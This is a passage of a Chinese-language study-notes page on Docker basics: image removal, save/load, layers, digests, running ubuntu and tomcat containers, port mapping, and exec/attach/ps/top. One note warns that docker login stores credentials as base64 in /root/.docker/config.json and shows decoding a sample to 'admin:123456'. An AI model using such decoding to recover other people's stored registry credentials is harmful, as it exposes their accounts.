Hub就会构建出新的镜像</p><pre><code>[root@localhost ~]# docker search --helpUsage:  docker search [OPTIONS] TERMSearch Docker Hub for imagesOptions:  -f, --filter filter   Filter output based on conditions provided -f和之前的images差不多      --format string   Pretty-print search using a Go template      --limit int       Max number of search results-限制个数      --no-trunc        Don&#39;t truncate output</code></pre><h2 id="dockers-rmi-删除容器-rm"><a href="#dockers-rmi-删除容器-rm" class="headerlink" title="dockers rmi(删除容器 rm)"></a>dockers rmi(删除容器 rm)</h2><pre><code>[root@localhost ~]# docker rmi --help​Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]​Remove one or more images​Aliases:  docker image rm, docker image remove, docker rmi​Options:  -f, --force      Force removal of the image --强制删除      --no-prune   Do not delete untagged parents --和镜像层相关​</code></pre><p>操作一下试试</p><pre><code>[root@localhost ~]# docker imagesREPOSITORY    TAG       IMAGE ID       CREATED         SIZEbusybox       latest    3f57d9401f8d   6 weeks ago     4.26MBhello-world   latest    d2c94e258dcb   10 months ago   13.3kBcentos        7         eeb6ee3f44bd   2 years ago     204MB[root@localhost ~]# docker rmi centos:7Untagged: centos:7Untagged: centos@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4Deleted: sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9Deleted: sha256:174f5685490326fc0a1c0f5570b8663732189b327007e47ff13d2ca59673db02[root@localhost ~]# docker imagesREPOSITORY    TAG       IMAGE ID       CREATED         SIZEbusybox       latest    3f57d9401f8d   6 weeks ago     4.26MBhello-world   latest    d2c94e258dcb   10 months ago   13.3kB[root@localhost ~]# docker rmi hello-worldError response from daemon: conflict: unable to remove repository reference &quot;hello-world&quot; (must force) - container 9c54e5ac2981 is using its referenced image d2c94e258dcb[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE         COMMAND    CREATED        STATUS                    PORTS     NAMES9c54e5ac2981   hello-world   &quot;/hello&quot;   6 hours ago    Exited (0) 6 hours ago              ecstatic_ride0881099d27ad   hello-world   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock[root@localhost ~]# docker rmi -f hello-worldUntagged: hello-world:latestUntagged: hello-world@sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21dDeleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE          COMMAND    CREATED        STATUS                    PORTS     NAMES9c54e5ac2981   d2c94e258dcb   &quot;/hello&quot;   7 hours ago    Exited (0) 7 hours ago              ecstatic_ride0881099d27ad   d2c94e258dcb   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock[root@localhost ~]# docker imagesREPOSITORY   TAG       IMAGE ID       CREATED       SIZEbusybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</code></pre><p>其中hello-world因为已经运行在容器里了，可以ps -a一下看看，然后用-f强制删除</p><h2 id="docker-save"><a href="#docker-save" class="headerlink" title="docker save"></a>docker save</h2><p>用来把镜像打包保存到本体，方变移动</p><pre><code>[root@localhost ~]# docker imagesREPOSITORY   TAG       IMAGE ID       CREATED       SIZEzookeeper    3.7       446078172ae8   2 weeks ago   307MBbusybox      latest    3f57d9401f8d   6 weeks ago   4.26MB[root@localhost ~]# docker save --help​Usage:  docker save [OPTIONS] IMAGE [IMAGE...]​Save one or more images to a tar archive (streamed to STDOUT by default)​Aliases:  docker image save, docker save​Options:  -o, --output string   Write to a file, instead of STDOUT[root@localhost ~]# docker save -o my.tar zookeeper:3.7 busybox:latest[root@localhost ~]# lltotal 310364...-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar...也可以重定向到一个文件里，用&gt;​[root@localhost ~]# docker save zookeeper:3.7 busybox:latest &gt; new.tar[root@localhost ~]# lltotal 620696...-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar-rw-r--r--. 1 root root 317776384 Mar  1 04:03 new.tar...大小都是一样得</code></pre><p><img src="/../image/image-20240301200411484.png" alt="image-20240301200411484"></p><p>这是原来的，然后把它们删除</p><pre><code>[root@localhost ~]# docker rmi 446078172ae8 3f57d9401f8d...[root@localhost ~]# docker imagesREPOSITORY   TAG       IMAGE ID   CREATED   SIZE</code></pre><p>然后再把tar加载出来</p><h2 id="docker-load"><a href="#docker-load" class="headerlink" title="docker load"></a>docker load</h2><pre><code>[root@localhost ~]# docker load --help​Usage:  docker load [OPTIONS]​Load an image from a tar archive or STDIN​Aliases:  docker image load, docker load​Options:  -i, --input string   Read from tar archive file, instead of STDIN  -q, --quiet          Suppress the load output</code></pre><pre><code>[root@localhost ~]# docker load -i my.tar2e112031b4b9: Loading layer  4.492MB/4.492MBLoaded image: busybox:latestd101c9453715: Loading layer  80.41MB/80.41MB431a6830edc6: Loading layer  38.53MB/38.53MBc5da6d3a7681: Loading layer  140.9MB/140.9MB48ea7a659f10: Loading layer   2.56kB/2.56kBda0e0faf395b: Loading layer  3.072kB/3.072kBfb2a43f5cc59: Loading layer  342.5kB/342.5kBadff97f6861e: Loading layer  10.88MB/10.88MB9b43d841bc28: Loading layer  42.15MB/42.15MB9abd5b933e89: Loading layer  3.072kB/3.072kBLoaded image: zookeeper:3.7</code></pre><p><img src="/../image/image-20240301200729066.png" alt="image-20240301200729066"></p><p>和之前对比一下，镜像id都是一样的，这个也有重定向的写法</p><pre><code>docker load &lt; my.tar</code></pre><p>效果是一样的</p><h2 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h2><p>Docker 镜像由一些<strong>松耦</strong>合的只读镜像层组成，Docker Daemon 负责堆叠这些镜像层，并将它们关联为一个统一的整体，即对外表现出的是一个独立的对象。“通过 docker pull 命令拉取指定的镜像时,每个 Pull complete 结尾的行就代表下载完毕了一个镜像层。·<br>例如，下面的 redis:latest 镜像就包含8个镜像层。</p><pre><code>[root@localhost ~]# docker pull redisUsing default tag: latestlatest: Pulling from library/redise1caac4eb9d2: Pull complete7469c6c5b625: Pull completea3d1b68c4a62: Pull complete152cbe749752: Pull complete7218480dfba1: Pull completee61c48a0d344: Pull complete4f4fb700ef54: Pull complete82adb0efabd8: Pull complete--如果存在则会显示Already existsDigest: sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402Status: Downloaded newer image for redis:latestdocker.io/library/redis:latest</code></pre><h3 id="为什么分层"><a href="#为什么分层" class="headerlink" title="为什么分层"></a>为什么分层</h3><p>采用这种分层结构的优势很多，例如，每个分层都是只读的，所有对分层的修改都是以新分层的形式出现，并不会破坏原分层内容:再如，每个分层只记录变更内容，所以有利于节省存储空间等。”<br>不过，分层结构的最大的好处是，在不同镜像间实现<strong>资源共享</strong>，即不同镜像对相同下层镜像的复用。对于 docker pull 命令,其在拉取之前会先获取到其要拉取镜像的所有 magelD,然后在本地查找是否存在这些分层。如果存在，则不再进行拉取，而是共享本地的该分层。大大节点的存储空间与网络带宽，提升了拉取效率。</p><h3 id="镜像层构成"><a href="#镜像层构成" class="headerlink" title="镜像层构成"></a>镜像层构成</h3><p>每个镜像层由两部分构成:<strong>镜像文件系统</strong>与<strong>镜像json</strong> 文件。这两部分具有相同的 magelD.镜像文件系统就是对镜像占有的磁盘空间进行管理的文件系统,拥有该镜像所有镜像层的数据内容。而镜像 json 文件则是用于描述镜像的相关属性的集合，通过 docker inspect [镜像]就可以直观看到。“</p><h4 id="镜像文件系统构成"><a href="#镜像文件系统构成" class="headerlink" title="镜像文件系统构成"></a>镜像文件系统构成</h4><p>一个 docker 镜像的文件系统由多层只读的镜像层组成，每层都完成了特定的功能而这些只读镜像层根据其位置与功能的不同可分为两类: <strong>基础镜像层</strong>与<strong>扩展镜像层.</strong><img src="/../image/image-20240302143631410.png" alt="image-20240302143631410"></p><ul><li>基础镜像层</li></ul><p>​所有镜像的最下层都具有一个可以<strong>看得到</strong>的基础镜像层 Base lmage,基础镜像层的文件系统称为根文件系统 rootfs。而 rootfs 则是建立在 Linux 系统中“<strong>看不到的</strong>”引导文件系统bootfs之上。</p><ul><li>扩展镜像层</li></ul><p>​在基础镜像层之上的镜像层称为扩展镜像层。顾名思义,其是对基础镜像层功能的扩展在 Dockerfile 中，每条指令都是用于完成某项特定功能的，而每条指令都会生成一个扩展镜像层。“</p><ul><li>容器层</li></ul><p>​一旦镜像运行了起来就形成了容器，而容器就是一个运行中的 Linux 系统，其也是具有文件系统的。容器的这个文件系统是在 docker 镜像<strong>最外层</strong>之上增加了一个<strong>可读写的容器层</strong>对文件的任何更改都只存在于容器层。因此任何对容器的操作都不会影响到镜像本身。“容器层如果需要修改某个文件，系统会从容器层开始向下一层层的查找该文件，直到找到为止。任何对于文件的操作都会记录在容器层。例如，要修改某文件，容器层会首先把在镜像层找到的文件 copy 到容器层，然后再进行修改。删除文件也只会将存在于容器层中的文件副本删除。“<br>​可以看出,Docker 容器就是一个叠加后的文件系统,而这个容器层称为 Union File System,联合文件系统。</p><h2 id="LinuxOS启动过程"><a href="#LinuxOS启动过程" class="headerlink" title="LinuxOS启动过程"></a>LinuxOS启动过程</h2><p>​现代操作系统都是 C&#x2F;S模式的微内核架构的，由两大部分构成:内核(Server)与服务模块(Client)。</p><p>​Linux的 bootfs 文件系统由两部分构成:bootloader（将kernel加载到内存，并引导kernel启动） 与kernel（启动后，内存使用权就又bootfs完全转交给kernel，然后kernel就会把bootfs卸载）。</p><p><img src="/../image/image-20240302163101380.png" alt="image-20240302163101380"></p><h2 id="镜像摘要"><a href="#镜像摘要" class="headerlink" title="镜像摘要"></a>镜像摘要</h2><p>每个镜像都有一个长度为64 位的16 进制字符串作为其摘要 digest。</p><pre><code>docker inspect [OPTIONS] NAME|ID [NAME|ID...]</code></pre><p>OPTIONS说明：</p><ul><li>**-f :**指定返回值的模板文件。</li><li>**-s :**显示总的文件大小。</li><li>**–type :**为指定类型返回JSON。</li></ul><p>查看摘要</p><pre><code>docker images xx --degists[root@localhost ~]# docker images redis --digestsREPOSITORY   TAG       DIGEST                                                                    IMAGE ID       CREATED       SIZEredis        latest    sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402   d1397258b209   7 weeks ago   138MB​</code></pre><p>一个镜像一旦创建完毕，其 digest 就不会发生改变了，因为镜像是只读的。。<br>Docker 默认采用的 Hash 算法是 SHA256，即 Hah 值是一个长度为 256 位的二进制值。<br>Docker 使用 16 进制表示，即变为了长度为 64 位的字符串。</p><h3 id="摘要作用"><a href="#摘要作用" class="headerlink" title="摘要作用"></a>摘要作用</h3><p>​摘要的主要作用是区分相同<repository>:<tag>的不同镜像。。<br>​例如镜像 xxx:2.8 在生产运行过程中发现存在一个 BUG。现对其进行了修复，并使用原标签将其 push 回了仓库，那么原镜像被覆盖。但生产环境中遗留了大量运行中的修复前镜像的容器。此时，通过镜像标签已经无法区分镜像是修复前的还是修复后的了，因为它们的标签是相同的。此时通过查看镜像的 digest 就可以区分出修改前后版本，因为内容发生了变化，digest一定会变。”<br>​为了确保再次拉取到的是修复后的镜像，可通过 digest 进行镜像拉取。其用法是:docker pull <repository>@<digest>.</p><h3 id="分发散列值"><a href="#分发散列值" class="headerlink" title="分发散列值"></a>分发散列值</h3><p>​在 push 或 pul 镜像时，都会对镜像进行压缩以减少网络带宽和传输时长。但压缩会改变镜像内容，会导致经过网络传输后，镜像内容与其digest不相符。出现问题。<br>​为了避免该问题该问题，Docker 又为镜像配置了 Distribution Hash(分发散列值)。在镜像被压缩后立即计算分发散列值，然后使该值随压缩过的镜像一同进行发送。在接收方接收后，立即计算压缩镜像的分发散列值，再与携带的分发散列值对比。如果相同，则说明传输没有问题。</p><h2 id="容器运行的本质"><a href="#容器运行的本质" class="headerlink" title="容器运行的本质"></a>容器运行的本质</h2><p>Docker 容器存在的意义就是为了运行容器中的应用，对外提供服务，所以启动容器的目的就是启动运行该容器中的应用。容器中的应用运行完毕后，容器就会自动终止。所以，如果不想让容器启动后立即终止运行，则就需要使容器应用不能立即结束。通常采用的方式有两种，使应用处于<strong>与用户交互</strong>的状态或<strong>等待状态</strong>。.</p><h3 id="docker交互式启动ubantu"><a href="#docker交互式启动ubantu" class="headerlink" title="docker交互式启动ubantu"></a>docker交互式启动ubantu</h3><pre><code>[root@localhost ~]# docker pull ubuntuUsing default tag: latestlatest: Pulling from library/ubuntu01007420e9b0: Pull completeDigest: sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0daStatus: Downloaded newer image for ubuntu:latestdocker.io/library/ubuntu:latest</code></pre><h4 id="遇到问题Error-docker-login—"><a href="#遇到问题Error-docker-login—" class="headerlink" title="遇到问题Error docker login—-"></a>遇到问题Error docker login—-</h4><p>Error response from daemon: pull access denied for ubantu, repository does not e                                                                              xist or may require ‘docker login’: denied: requested access to the resource is                                                                               denied</p><p>解决方案</p><pre><code>docker login然后输入你的账号密码</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>密码会保存在&#x2F;root&#x2F;.docker&#x2F;config.json文件下，要注意保护，加密方式是Base64，解码出来时账号:密码的格式，还是挺危险的</p><pre><code>[root@localhost ~]# echo &quot;YWRtaW46MTIzNDU2==&quot; | base64 --decodeadmin:123456 base64: invalid input</code></pre><pre><code>docker run --name myubantu ubantu #--name重命名方便查询进程[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE          COMMAND       CREATED          STATUS                      PORTS     NAMES6bb10ad29613   ubuntu         &quot;/bin/bash&quot;   4 seconds ago    Exited (0) 3 seconds ago              myubuntu</code></pre><p>可以发现是退出的状态，所以我们需要加上一个bash来添加命令行，然后容器里不允许重名，所以–name 后可以加个2，</p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li>**ubuntu这是指用 ubuntu镜像为基础来启动容器。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><pre><code>docker run --name mybantu2 -it ubuntu /bin/bash #-i是交互式命令，-t是给一个伪客户端， /bin/bash是常用shell的路径[root@localhost ~]# docker run --name mybuntu2 -it ubuntu /bin/bashroot@939a1dcb875c:/# lsbin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</code></pre><p>可以看到这就进来了，但有很多命令这个系统里是没有，然后可以按exit退出</p><p>但有时候这个&#x2F;bin&#x2F;bash也可以不加，不懂什么时候要什么时候不要</p><ul><li>原因：可以看dockerfile里的镜像层，有一个CMD[‘bash’],是作为run参数里的一个选项，没有的话默认就是bash</li></ul><h3 id="docker交互式启动tomcat"><a href="#docker交互式启动tomcat" class="headerlink" title="docker交互式启动tomcat"></a>docker交互式启动tomcat</h3><p>与ubuntu不同的是，tomcat启动时需要注意一些东西，这里就不用最新版了</p><pre><code>docker pull tomcat:8.5.49[root@localhost ~]# docker run --name mytom -it tomcat:8.5.49 /bin/bashroot@df72620e3480:/usr/local/tomcat# lsBUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  workCONTRIBUTING.md  README.md      bin          lib      tempLICENSE          RELEASE-NOTES  conf         logs     webapps</code></pre><p>可以发现和解压出来的一样，但tomcat是未启动，原因出在&#x2F;bin&#x2F;bash</p><pre><code>docker run --name mytom2 -it tomcat:8.5.49...Server startup in 888 ms</code></pre><p>这时候会发现tomcat启动了，用网页访问试试,还是不行，因为端口8080是centos的里某个占用这个端口的应用，但此时没有，所以不行，需要用到端口映射，把它暴露给宿主机</p><pre><code>docker run --name mytom3 -it -p 8081:8080 tomcat:8.5.49  左边是宿主机的端口，右边是容器里的端口第一个8081是暴露linux 的端口号，这样外部才能连接linux第二个端口号暴露的是容器的端口号，这样linux才能连接容器-P是随机分配到默认即 rand:default 因为不可控，所以不常用            </code></pre><p>需要注意的是-p这个参数要放在容器左边，不然会出问题，但视频里可以访问，我的不知道为什么，虚拟机里可以访问，但自己的windows主机访问不了</p><h4 id="遇到问题网络没了"><a href="#遇到问题网络没了" class="headerlink" title="遇到问题网络没了"></a>遇到问题网络没了</h4><ul><li><a href="https://zhuanlan.zhihu.com/p/426926356">解决方法</a></li></ul><pre><code>chkconfig --list --看看配置里是否有网络管理工具冲突，保留一个即可systemctl stop NetworkManagersystemctl restart Network.Service</code></pre><ul><li>docker ps -a的内容太多</li></ul><pre><code> docker rm $(docker ps -a -q) 删除所有已经停止的容器</code></pre><p><img src="/../image/image-20240303135819090.png" alt="image-20240303135819090"></p><p>终于是进来了，有两种退出方式</p><pre><code>ctrl + p + q容器还是up的ctrl + c 就直接退出了[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED         STATUS         PORTS                                       NAMESb162037cb017   tomcat:8.5.49   &quot;catalina.sh run&quot;   7 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   tom1</code></pre><p>这里可以发现 command就不是&#x2F;bin&#x2F;bash了，俄式一个.sh文件</p><p>tips：0.0.0.0 ipv4的任意ip   ::: ipv6的任意ip</p><h3 id="守护进程方式启动tomcat"><a href="#守护进程方式启动tomcat" class="headerlink" title="守护进程方式启动tomcat"></a>守护进程方式启动tomcat</h3><p>但如果伪终端一直存在，对后续的操作并不是很方便，所以我们可以把-it参数换成-d</p><pre><code>[root@localhost ~]# docker run --name tom2 -dp 8081:8080 tomcat:8.5.49e37ef6eeb57e3ef728d06c3807ace699a4292266fe8b295f384a04afc4e28c93</code></pre><p><img src="/../image/image-20240303141539414.png" alt="image-20240303141539414"></p><p>可以看到8081也是可以访问的，但以此方式启动ubuntu是退出状态，因为未提供可交互的平台，当我们不知道时，可以看该镜像的dockerfile，里面会告诉我们要不要写。</p><h3 id="对高版本的tomcat的访问"><a href="#对高版本的tomcat的访问" class="headerlink" title="对高版本的tomcat的访问"></a>对高版本的tomcat的访问</h3><pre><code>docker pull tomcat:8.5.50docker run --name tom3 -dp 8084:8080 tomcat:8.5.50</code></pre><p><img src="/../image/image-20240303151123587.png" alt="image-20240303151123587"></p><p>服务启动了，但没找到资源，说不定是网站页面文件配置有问题，所以我们进入tomcat的文件里看看</p><pre><code>docker run --name tom4 -it tomcat:8.5.50 /bin/bash --这里就不用-p参数了，因为访问不了，只是看看配置文件root@48c67ba22d08:/usr/local/tomcat# lsBUILDING.txt     README.md      conf     native-jni-lib  workCONTRIBUTING.md  RELEASE-NOTES  include  tempLICENSE          RUNNING.txt    lib      webappsNOTICE           bin            logs     webapps.dist</code></pre><p>可以发现多了一个webapps.dist，原本应该访问webapps文件的，但资源都放在dist里，我们需要移动一下文件,因为之前启动过一个tom3，我们用新命令exec来进入改一下文件</p><pre><code>docker exec -it tom3 /bin/bashroot@e85341ca6a4a:/usr/local/tomcat# rm -rf webappsroot@e85341ca6a4a:/usr/local/tomcat# lsBUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  workCONTRIBUTING.md  README.md      bin          lib      tempLICENSE          RELEASE-NOTES  conf         logs     webapps.distroot@e85341ca6a4a:/usr/local/tomcat# mv webapps.dist/ webappsroot@e85341ca6a4a:/usr/local/tomcat# lsBUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  workCONTRIBUTING.md  README.md      bin          lib      tempLICENSE          RELEASE-NOTES  conf         logs     webapps</code></pre><p>现在webapps里面有东西，再重新访问试试，发现可以了</p><p><img src="/../image/image-20240303152829813.png" alt="image-20240303152829813"></p><p>对于高板本的问题，主要是webapps的目录是空的，需要移过去</p><h3 id="容器退出命令"><a href="#容器退出命令" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><pre><code>docker rm -f $(docker ps -a)强制删除全部容器[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMESexit ctrl p + q</code></pre><h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><pre><code>[root@localhost ~]# docker psCONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMESfc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom[root@localhost ~]# docker exec -it tom /bin/bashroot@fc32e8b34259:/usr/local/tomcat# exitexit[root@localhost ~]# docker psCONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMESfc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</code></pre><p>可以看到不影响容器的状态</p><pre><code>[root@localhost ~]# docker exec --helpUsage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]Execute a command in a running containerAliases:  docker container exec, docker execOptions:  - d, --detach               Detached mode: run command in the background  --后台运行，分离模式      --detach-keys string   Override the key sequence for detaching a container --指定别的快捷键组合替代ctrl p q  -e, --env list             Set environment variables 设置环境变量      --env-file list        Read in a file of environment variables  文件形式配置环境变量  -i, --interactive          Keep STDIN open even if not attached  交互方式      --privileged           Give extended privileges to the command  扩展特权  -t, --tty    伪客户端              Allocate a pseudo-TTY  -u, --user string     有的容器需要身份认证     Username or UID (format: &quot;&lt;name|uid&gt;[:&lt;group|gid&gt;]&quot;)  -w, --workdir string       Working directory inside the container 设置工作目录</code></pre><p>基本在docker run里都有</p><pre><code>[root@localhost ~]# docker exec -w /root -it tom /bin/bashroot@fc32e8b34259:~# pwd/root</code></pre><p>有时候需要查看容器的ip，我们也可以不用进去，把bash换成你想执行的命令即可</p><pre><code>[root@localhost ~]# docker exec -it tom ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0       valid_lft forever preferred_lft forever[root@localhost ~]# docker exec -it tom pwd/usr/local/tomcat</code></pre><h3 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h3><p>和exec类似,但对tomcat有例外，进不去</p><pre><code>[root@localhost ~]# docker run --name buntu -it ubuntu /bin/bashroot@0c5e1d974b26:/# [root@localhost ~]#[root@localhost ~]#[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         17 seconds ago   Up 15 seconds                                               buntufc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   42 minutes ago   Up 42 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom[root@localhost ~]# docker exec -it buntu /bin/bashroot@0c5e1d974b26:/# exitexit[root@localhost ~]# docker attach bunturoot@0c5e1d974b26:/# lsbin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  varboot  etc  lib   lib64  media   opt  root  sbin  sys  usrroot@0c5e1d974b26:/# exitexit[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED              STATUS                     PORTS                                       NAMES0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         About a minute ago   Exited (0) 9 seconds ago                                               buntufc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   43 minutes ago       Up 43 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</code></pre><p>可以看到docker exec 退出后进程还在，但docker attach退出后，进程也退出了，说明exec是创建新的进程来操作，而attach是进入到本体进程去操作，退出后，就都退出了，但docker attach进不去tomcat</p><pre><code>docker attach tom,只会流个光标闪烁，但此时你退出后tomcat也退出了[root@localhost ~]# docker attach --helpUsage:  docker attach [OPTIONS] CONTAINERAttach local standard input, output, and error streams to a running containerAliases:  docker container attach, docker attachOptions:      --detach-keys string   Override the key sequence for detaching a container      --no-stdin             Do not attach STDIN 键盘输入不起作用，默认false      --sig-proxy            Proxy all received signals to the process (default true) 接收的信号代理到进程</code></pre><pre><code>[root@localhost ~]# docker start buntubuntu[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED             STATUS                        PORTS     NAMES0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         26 minutes ago      Up 3 seconds                            buntu</code></pre><p>因为ubuntu的cmd是bash，是命令行</p><pre><code>[root@localhost ~]# docker exec -it tom /bin/bashroot@fc32e8b34259:/usr/local/tomcat# cd logsroot@fc32e8b34259:/usr/local/tomcat/logs# lscatalina.2024-03-03.log  host-manager.2024-03-03.log  localhost.2024-03-03.log  localhost_access_log.2024-03-03.txt  manager.2024-03-03.logroot@fc32e8b34259:/usr/local/tomcat/logs# cat localhost_access_log.2024-03-03.txt192.168.174.1 - - [03/Mar/2024:09:05:56 +0000] &quot;GET / HTTP/1.1&quot; 200 11215</code></pre><p>在tomcat中启停日志的信息会保存到catalina.—.log，访问时这个文件不会变，只有启动关闭时才会变化，然后其中一个参数catalina.sh和下面这个命令差不多</p><p><strong>tail -f filename</strong> 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p><p><strong>命令格式：</strong></p><pre><code>tail [参数] [文件]  </code></pre><p><strong>参数：</strong></p><ul><li>-f 循环读取</li><li>-q 不显示处理信息</li><li>-v 显示详细的处理信息</li><li>-c&lt;数目&gt; 显示的字节数</li><li>-n&lt;行数&gt; 显示文件的尾部 n 行内容</li><li>–pid&#x3D;PID 与-f合用,表示在进程ID,PID死掉之后结束</li><li>-q, –quiet, –silent 从不输出给出文件名的首部</li><li>-s, –sleep-interval&#x3D;S 与-f合用,表示在每次反复的间隔休眠S秒</li></ul><p><strong>实例</strong></p><p>要显示 notes.log 文件的最后 10 行，请输入以下命令：</p><pre><code>tail notes.log         # 默认显示最后 10 行</code></pre><h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><pre><code>[root@localhost ~]# docker ps --helpUsage:  docker ps [OPTIONS]List containersAliases:  docker container ls, docker container list, docker container ps, docker psOptions:  -a, --all             Show all containers (default shows just running)  -f, --filter filter   Filter output based on conditions provided 过滤条件      --format string   Format output using a custom template: 格式化输出                        &#39;table&#39;:            Print output in table format with                        column headers (default)                        &#39;table TEMPLATE&#39;:   Print output in table format using                        the given Go template                        &#39;json&#39;:             Print in JSON format                        &#39;TEMPLATE&#39;:         Print output using the given Go                        template.                        Refer to https://docs.docker.com/go/formatting/ for more                        information about formatting output with templates  -n, --last int        Show n last created containers (includes all states)                        (default -1) 显示n个容器  -l, --latest          Show the latest created container (includes all states) 显示最后一个创建的容器      --no-trunc        Don&#39;t truncate output  完整显示输出  -q, --quiet           Only display container IDs  -s, --size            Display total file sizes</code></pre><h3 id="docker-top"><a href="#docker-top" class="headerlink" title="docker top"></a>docker top</h3><pre><code>[root@localhost ~]# docker ps 默认显示正在运行的容器CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS             PORTS                                       NAMESfc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom[root@localhost ~]# docker ps -aCONTAINER ID   IMAGE           COMMAND             CREATED       STATUS                   PORTS                                       NAMES0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         6 hours ago   Exited (0) 5 hours ago                                               buntufc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour         0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom[root@localhost ~]# docker top tomUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                14342               14323               0                   20:37               pts/0               00:00:07            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start[root@localhost ~]# docker top tom1UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMDroot                16306               16287               0                   21:54               pts/0               00:00:00            /bin/bash</code></pre><p>tty 是“<strong>teletypewriter</strong>”的缩写，但通常被称为终端，它允许您通过将数据（您的输入）传递给系统并显示系统产生的输出来与系统进行交互。</p><pre><code>[root@localhost ~]# docker top --helpUsage:  docker top CONTAINER [ps OPTIONS]Display the running processes of a containerAliases:  docker container top, docker top</code></pre><p>这里的参数是指ps的参数在这里也是可以用的</p><pre><code>[root@localhost ~]# ps   PID TTY          TIME CMD  3825 pts/1    00:00:00 su  3831 pts/1    00:00:00 bash  8640 pts/1    00:00:00 ps[root@localhost ~]# ps -lF S   UID    PID   PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD4 S     0   3825   3758  0  80   0 - 47494 wait   pts/1    00:00:00 su4 S     0   3831   3825  0  80   0 - 29143 wait   pts/1    00:00:00 bash0 R     0   8641   3831  0  80  